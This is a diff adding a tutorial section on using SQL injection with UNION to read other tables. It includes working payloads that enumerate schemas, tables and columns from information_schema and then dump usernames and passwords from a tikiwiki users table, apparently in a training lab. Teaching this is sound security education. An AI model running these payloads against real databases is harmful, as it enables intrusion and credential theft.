@@ -4,7 +4,7 @@
 • How do SQL injection attacks work
 • Basic SQL Injection Examples
 • SQL Injection using UNION
-• 
+• Using UNION to Retrieve Data from other Tables
 • 
 • 
 • 
@@ -147,10 +147,81 @@ We can also use one or more of the following functions to retrieve information a
 • current_user() : Current User
 
 
+-- Using UNION to Retrieve Data from other Tables --
+
+UNION statements can also be used to retrieve data from other databases and tables. Before we can do this, we need to know which other databases are available on the database server and which tables they contain so we can reference them properly in the queries
+
+0' or 0=0 UNION SELECT table_schema, table_name from information_schema.tables #
+
+The next step would be to list all columns from the different tables. 
+
+0' or 0=0 UNION SELECT 1,concat(table_name,char(58),column_name) from information_schema.columns #
+
+Modify the SQL query to display the username and password values from the tikiwiki195.tiki_users table
+
+0' or 0=0 UNION SELECT user, password from tikiwiki195.tiki_users #
 
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*
 
 
 
